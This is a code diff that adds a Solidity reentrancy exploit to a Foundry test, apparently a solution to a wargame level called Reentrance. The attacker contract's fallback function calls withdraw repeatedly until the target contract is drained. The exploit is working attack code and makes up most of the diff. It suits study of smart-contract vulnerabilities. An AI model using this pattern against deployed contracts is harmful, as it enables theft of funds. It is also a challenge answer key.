@@ -38,7 +38,26 @@ contract TestReentrance is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
-
+        Exploiter exploit = new Exploiter();
+        exploit.attack{value: 0.002 ether}(level, 0.001 ether);
         vm.stopPrank();
+    }
+}
+
+contract Exploiter {
+    Reentrance re;
+    uint256 value;
+
+    fallback() external payable {
+        if (re.balanceOf(address(this)) >= 0.001 ether) {
+            re.withdraw(0.001 ether);
+        }
+    }
+
+    function attack(Reentrance ret, uint256 insertcoin) public payable {
+        re = ret;
+        value = insertcoin;
+        re.donate{value: value}(address(this));
+        re.withdraw(value);
     }
 }
